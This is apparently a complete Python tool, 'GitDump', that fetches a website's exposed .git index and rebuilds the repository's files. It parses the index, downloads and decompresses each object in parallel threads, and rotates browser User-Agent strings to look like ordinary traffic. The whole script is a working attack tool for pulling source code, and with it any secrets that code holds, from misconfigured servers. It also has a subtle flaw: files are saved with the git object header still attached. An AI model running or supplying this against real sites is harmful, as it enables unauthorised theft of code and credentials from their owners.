#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import sys
import http.client
import queue
import os
import zlib
from concurrent.futures import ThreadPoolExecutor
import re
import time
import mmap
import struct
import binascii
import collections
from urllib.parse import urlparse
import argparse

# User-Agent pool for HTTP requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
]

INDEX_NAME= "index_repo_temp_file"


class GitIndexParser:
    def __init__(self, filename, pretty=True):
        self.filename = filename
        self.pretty = pretty

    def _check(self, condition, message):
        if not condition:
            print("error: " + message)
            sys.exit(1)

    def _read(self, file, format):
        format = "! " + format
        bytes = file.read(struct.calcsize(format))
        return struct.unpack(format, bytes)[0]

    def parse(self):
        with open(self.filename, "rb") as o:
            file = mmap.mmap(o.fileno(), 0, access=mmap.ACCESS_READ)

            index = collections.OrderedDict()
            index["signature"] = file.read(4).decode("ascii")
            self._check(index["signature"] == "DIRC", "Not a Git index file")

            index["version"] = self._read(file, "I")
            self._check(index["version"] in {2, 3},
                        "Unsupported version: %s" % index["version"])

            index["entries"] = self._read(file, "I")

            yield index

            for n in range(index["entries"]):
                entry = collections.OrderedDict()

                entry["entry"] = n + 1
                entry["ctime_seconds"] = self._read(file, "I")
                entry["ctime_nanoseconds"] = self._read(file, "I")
                if self.pretty:
                    entry["ctime"] = entry["ctime_seconds"] + entry["ctime_nanoseconds"] / 1e9
                    del entry["ctime_seconds"]
                    del entry["ctime_nanoseconds"]

                entry["mtime_seconds"] = self._read(file, "I")
                entry["mtime_nanoseconds"] = self._read(file, "I")
                if self.pretty:
                    entry["mtime"] = entry["mtime_seconds"] + entry["mtime_nanoseconds"] / 1e9
                    del entry["mtime_seconds"]
                    del entry["mtime_nanoseconds"]

                entry["dev"] = self._read(file, "I")
                entry["ino"] = self._read(file, "I")
                entry["mode"] = "%06o" % self._read(file, "I") if self.pretty else self._read(file, "I")
                entry["uid"] = self._read(file, "I")
                entry["gid"] = self._read(file, "I")
                entry["size"] = self._read(file, "I")

                entry["sha1"] = binascii.hexlify(file.read(20)).decode("ascii")
                entry["flags"] = self._read(file, "H")

                entry["assume-valid"] = bool(entry["flags"] & (0b10000000 << 8))
                entry["extended"] = bool(entry["flags"] & (0b01000000 << 8))
                stage_one = bool(entry["flags"] & (0b00100000 << 8))
                stage_two = bool(entry["flags"] & (0b00010000 << 8))
                entry["stage"] = stage_one, stage_two
                namelen = entry["flags"] & 0xFFF

                entrylen = 62

                if entry["extended"] and (index["version"] == 3):
                    entry["extra-flags"] = self._read(file, "H")
                    entrylen += 2

                if namelen < 0xFFF:
                    entry["name"] = file.read(namelen).decode("utf-8", "replace")
                    entrylen += namelen
                else:
                    name = []
                    while True:
                        byte = file.read(1)
                        if byte == b"\x00":
                            break
                        name.append(byte)
                    entry["name"] = b"".join(name).decode("utf-8", "replace")
                    entrylen += 1

                padlen = (8 - (entrylen % 8)) or 8
                nuls = file.read(padlen)
                self._check(set(nuls) == {0}, "padding contained non-NUL")

                yield entry

            file.close()

class Scanner:
    def __init__(self, base_url, threads, verbosity=0):
        self.base_url = base_url.rstrip("/")
        self.domain = urlparse(base_url).netloc.replace(":", "_")
        self.dest_dir = os.path.abspath(self.domain)
        self.threads = threads
        self.verbosity = verbosity

        os.makedirs(self.dest_dir, exist_ok=True)

        self._log(1, "[+] Downloading and parsing index file...")
        try:
            index_data = self._request_data(f"{self.base_url}/index")
        except Exception as e:
            print(f"[ERROR] Failed to download index file: {e}")
            sys.exit(-1)

        self.index_path = os.path.join(self.dest_dir, INDEX_NAME)
        with open(self.index_path, "wb") as f:
            f.write(index_data)

        self.queue = queue.Queue()
        parser = GitIndexParser(self.index_path, pretty=True)
        for entry in parser.parse():
            if "sha1" in entry:
                entry_name = entry["name"].strip()
                if self.is_valid_name(entry_name):
                    self.queue.put((entry["sha1"].strip(), entry_name))
                    self._log(1, f"[+] Found: {entry_name}")

    def _log(self, level, message):
        if self.verbosity >= level:
            print(message)

    def is_valid_name(self, entry_name):
        dest_path = os.path.abspath(os.path.join(self.dest_dir, entry_name))
        return (
            ".." not in entry_name and
            not entry_name.startswith(("/", "\\")) and
            dest_path.startswith(self.dest_dir)
        )

    def _request_data(self, url):
        headers = {"User-Agent": USER_AGENTS[hash(url) % len(USER_AGENTS)]}
        parsed_url = urlparse(url)
        connection = http.client.HTTPSConnection(parsed_url.netloc) if parsed_url.scheme == "https" else http.client.HTTPConnection(parsed_url.netloc)

        try:
            connection.request("GET", parsed_url.path, headers=headers)
            response = connection.getresponse()

            if response.status != 200:
                raise Exception(f"HTTP Error {response.status}")

            return response.read()
        finally:
            connection.close()

    def process_file(self, task):
        sha1, file_name = task

        for _ in range(3):
            try:
                folder = f"/objects/{sha1[:2]}/"
                data = self._request_data(f"{self.base_url}{folder}{sha1[2:]}")

                try:
                    data = zlib.decompress(data)
                except zlib.error:
                    self._log(2, f"[ERROR] Failed to decompress {file_name}")
                    break

                target_dir = os.path.join(self.dest_dir, os.path.dirname(file_name))
                os.makedirs(target_dir, exist_ok=True)

                with open(os.path.join(self.dest_dir, file_name), "wb") as f:
                    f.write(data)

                self._log(0, f"[OK] {file_name}")
                break
            except Exception as e:
                self._log(2, f"[ERROR] {file_name}: {e}")

    def scan(self):
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while not self.queue.empty():
                task = self.queue.get()
                executor.submit(self.process_file, task)

    def cleanup(self):
        if os.path.exists(self.index_path):
            os.remove(self.index_path)
            self._log(1, "[+] Removed temporary index file.")


if __name__ == "__main__":
    import argparse

    # Argument parsing
    parser = argparse.ArgumentParser(
        description="GitDump: A tool for downloading and reconstructing Git repositories from disclosed .git directories.",
        epilog="Example usage: python git_dump.py http://example.com/.git/"
    )
    parser.add_argument("url", help="The base URL of the target Git repository (ending in .git/).")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads to use (default: 10).")
    parser.add_argument("-v", "--verbosity", type=int, choices=[0, 1, 2], default=0, help="Verbosity level (0: only downloaded files, 1: show files found, 2: show errors).")
    args = parser.parse_args()

    # Start scanning
    print(f"Starting GitDump on {args.url} with {args.threads} threads and verbosity level {args.verbosity}...")
    scanner = Scanner(args.url, args.threads, args.verbosity)
    scanner.scan()
    scanner.cleanup()
    print("GitDump completed successfully.")

